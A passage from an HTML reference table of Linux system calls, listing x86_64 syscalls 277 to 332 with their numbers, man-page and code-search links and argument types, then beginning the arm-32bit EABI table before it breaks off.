href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tee">cs/</a></td><td align="center">0x114</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">277</td><td>sync_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync_file_range">cs/</a></td><td align="center">0x115</td><td>int fd</td><td>loff_t offset</td><td>loff_t nbytes</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">278</td><td>vmsplice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vmsplice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vmsplice">cs/</a></td><td align="center">0x116</td><td>int fd</td><td>const struct iovec *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">279</td><td>move_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/move_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*move_pages">cs/</a></td><td align="center">0x117</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void * *pages</td><td>const int *nodes</td><td>int *status</td><td>int flags</td></tr><tr><td align="center">280</td><td>utimensat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utimensat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimensat">cs/</a></td><td align="center">0x118</td><td>int dfd</td><td>const char *filename</td><td>struct __kernel_timespec *utimes</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">281</td><td>epoll_pwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_pwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_pwait">cs/</a></td><td align="center">0x119</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td></tr><tr><td align="center">282</td><td>signalfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd">cs/</a></td><td align="center">0x11a</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">283</td><td>timerfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_create">cs/</a></td><td align="center">0x11b</td><td>int clockid</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">284</td><td>eventfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd">cs/</a></td><td align="center">0x11c</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">285</td><td>fallocate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fallocate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fallocate">cs/</a></td><td align="center">0x11d</td><td>int fd</td><td>int mode</td><td>loff_t offset</td><td>loff_t len</td><td>-</td><td>-</td></tr><tr><td align="center">286</td><td>timerfd_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_settime">cs/</a></td><td align="center">0x11e</td><td>int ufd</td><td>int flags</td><td>const struct __kernel_itimerspec *utmr</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td></tr><tr><td align="center">287</td><td>timerfd_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_gettime">cs/</a></td><td align="center">0x11f</td><td>int ufd</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">288</td><td>accept4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/accept4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept4">cs/</a></td><td align="center">0x120</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td align="center">289</td><td>signalfd4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd4">cs/</a></td><td align="center">0x121</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">290</td><td>eventfd2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd2">cs/</a></td><td align="center">0x122</td><td>unsigned int count</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">291</td><td>epoll_create1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create1">cs/</a></td><td align="center">0x123</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">292</td><td>dup3</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup3.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup3">cs/</a></td><td align="center">0x124</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">293</td><td>pipe2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe2">cs/</a></td><td align="center">0x125</td><td>int *fildes</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">294</td><td>inotify_init1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init1">cs/</a></td><td align="center">0x126</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">295</td><td>preadv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv">cs/</a></td><td align="center">0x127</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">296</td><td>pwritev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev">cs/</a></td><td align="center">0x128</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">297</td><td>rt_tgsigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_tgsigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_tgsigqueueinfo">cs/</a></td><td align="center">0x129</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td></tr><tr><td align="center">298</td><td>perf_event_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/perf_event_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*perf_event_open">cs/</a></td><td align="center">0x12a</td><td>struct perf_event_attr *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">299</td><td>recvmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmmsg">cs/</a></td><td align="center">0x12b</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">300</td><td>fanotify_init</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_init">cs/</a></td><td align="center">0x12c</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">301</td><td>fanotify_mark</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_mark.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_mark">cs/</a></td><td align="center">0x12d</td><td>int fanotify_fd</td><td>unsigned int flags</td><td>u64 mask</td><td>int fd</td><td>const char *pathname</td><td>-</td></tr><tr><td align="center">302</td><td>prlimit64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prlimit64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prlimit64">cs/</a></td><td align="center">0x12e</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 *new_rlim</td><td>struct rlimit64 *old_rlim</td><td>-</td><td>-</td></tr><tr><td align="center">303</td><td>name_to_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/name_to_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*name_to_handle_at">cs/</a></td><td align="center">0x12f</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flag</td><td>-</td></tr><tr><td align="center">304</td><td>open_by_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open_by_handle_at">cs/</a></td><td align="center">0x130</td><td>int mountdirfd</td><td>struct file_handle *handle</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">305</td><td>clock_adjtime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_adjtime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_adjtime">cs/</a></td><td align="center">0x131</td><td>clockid_t which_clock</td><td>struct __kernel_timex *tx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">306</td><td>syncfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syncfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syncfs">cs/</a></td><td align="center">0x132</td><td>int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">307</td><td>sendmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmmsg">cs/</a></td><td align="center">0x133</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>-</td><td>-</td></tr><tr><td align="center">308</td><td>setns</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setns.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setns">cs/</a></td><td align="center">0x134</td><td>int fd</td><td>int nstype</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">309</td><td>getcpu</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcpu.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcpu">cs/</a></td><td align="center">0x135</td><td>unsigned *cpu</td><td>unsigned *node</td><td>struct getcpu_cache *cache</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">310</td><td>process_vm_readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_readv">cs/</a></td><td align="center">0x136</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">311</td><td>process_vm_writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_writev">cs/</a></td><td align="center">0x137</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">312</td><td>kcmp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kcmp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kcmp">cs/</a></td><td align="center">0x138</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td>-</td></tr><tr><td align="center">313</td><td>finit_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/finit_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*finit_module">cs/</a></td><td align="center">0x139</td><td>int fd</td><td>const char *uargs</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">314</td><td>sched_setattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setattr">cs/</a></td><td align="center">0x13a</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">315</td><td>sched_getattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getattr">cs/</a></td><td align="center">0x13b</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">316</td><td>renameat2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat2">cs/</a></td><td align="center">0x13c</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>unsigned int flags</td><td>-</td></tr><tr><td align="center">317</td><td>seccomp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*seccomp">cs/</a></td><td align="center">0x13d</td><td>unsigned int op</td><td>unsigned int flags</td><td>void *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">318</td><td>getrandom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrandom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrandom">cs/</a></td><td align="center">0x13e</td><td>char *buf</td><td>size_t count</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">319</td><td>memfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*memfd_create">cs/</a></td><td align="center">0x13f</td><td>const char *uname_ptr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">320</td><td>kexec_file_load</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kexec_file_load.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kexec_file_load">cs/</a></td><td align="center">0x140</td><td>int kernel_fd</td><td>int initrd_fd</td><td>unsigned long cmdline_len</td><td>const char *cmdline_ptr</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">321</td><td>bpf</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bpf.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bpf">cs/</a></td><td align="center">0x141</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">322</td><td>execveat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execveat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execveat">cs/</a></td><td align="center">0x142</td><td>int dfd</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>int flags</td><td>-</td></tr><tr><td align="center">323</td><td>userfaultfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*userfaultfd">cs/</a></td><td align="center">0x143</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">324</td><td>membarrier</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/membarrier.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*membarrier">cs/</a></td><td align="center">0x144</td><td>int cmd</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">325</td><td>mlock2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock2">cs/</a></td><td align="center">0x145</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">326</td><td>copy_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/copy_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*copy_file_range">cs/</a></td><td align="center">0x146</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">327</td><td>preadv2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv2">cs/</a></td><td align="center">0x147</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">328</td><td>pwritev2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev2">cs/</a></td><td align="center">0x148</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">329</td><td>pkey_mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_mprotect">cs/</a></td><td align="center">0x149</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>int pkey</td><td>-</td><td>-</td></tr><tr><td align="center">330</td><td>pkey_alloc</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_alloc.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_alloc">cs/</a></td><td align="center">0x14a</td><td>unsigned long flags</td><td>unsigned long init_val</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">331</td><td>pkey_free</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_free.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_free">cs/</a></td><td align="center">0x14b</td><td>int pkey</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">332</td><td>statx</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statx.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statx">cs/</a></td><td align="center">0x14c</td><td>int dfd</td><td>const char *path</td><td>unsigned flags</td><td>unsigned mask</td><td>struct statx *buffer</td><td>-</td></tr></tbody></table><h1 id="0x3-arm-32bit-EABI"><a href="#0x3-arm-32bit-EABI" class="headerlink" title="0x3 arm-32bit/EABI"></a>0x3 arm-32bit/EABI</h1><table><thead><tr><th align="center">NR</th><th>syscall name</th><th align="center">references</th><th align="center">%r7</th><th>arg0 (%r0)</th><th>arg1 (%r1)</th><th>arg2 (%r2)</th><th>arg3 (%r3)</th><th>arg4 (%r4)</th><th>arg5 (%r5)</th></tr></thead><tbody><tr><td align="center">0</td><td>restart_syscall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/restart_syscall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*restart_syscall">cs/</a></td><td align="center">0x00</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">1</td><td>exit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit">cs/</a></td><td align="center">0x01</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">2</td><td>fork</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fork.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fork">cs/</a></td><td align="center">0x02</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">3</td><td>read</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/read.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*read">cs/</a></td><td align="center">0x03</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">4</td><td>write</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/write.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*write">cs/</a></td><td align="center">0x04</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">5</td><td>open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open">cs/</a></td><td align="center">0x05</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">6</td><td>close</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/close.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*close">cs/</a></td><td align="center">0x06</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">7</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x07</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">8</td><td>creat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/creat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*creat">cs/</a></td><td align="center">0x08</td><td>const char *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">9</td><td>link</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/link.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*link">cs/</a></td><td align="center">0x09</td><td>const char *oldname</td><td>const char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">10</td><td>unlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlink">cs/</a></td><td align="center">0x0a</td><td>const char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">11</td><td>execve</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execve.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execve">cs/</a></td><td align="center">0x0b</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">12</td><td>chdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chdir">cs/</a></td><td align="center">0x0c</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">13</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x0d</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">14</td><td>mknod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mknod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknod">cs/</a></td><td align="center">0x0e</td><td>const char *filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">15</td><td>chmod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chmod">cs/</a></td><td align="center">0x0f</td><td>const char *filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">16</td><td>lchown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lchown">cs/</a></td><td align="center">0x10</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">17</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x11</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">18</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x12</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">19</td><td>lseek</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lseek">cs/</a></td><td align="center">0x13</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int whence</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">20</td><td>getpid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpid">cs/</a></td><td align="center">0x14</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">21</td><td>mount</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mount.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mount">cs/</a></td><td align="center">0x15</td><td>char *dev_name</td><td>char *dir_name</td><td>char *type</td><td>unsigned long flags</td><td>void *data</td><td>-</td></tr><tr><td align="center">22</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x16</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">23</td><td>setuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid">cs/</a></td><td align="center">0x17</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">24</td><td>getuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid">cs/</a></td><td align="center">0x18</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">25</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x19</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">26</td><td>ptrace</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ptrace">cs/</a></td><td align="center">0x1a</td><td>long request</td><td>long pid</td><td>unsigned long 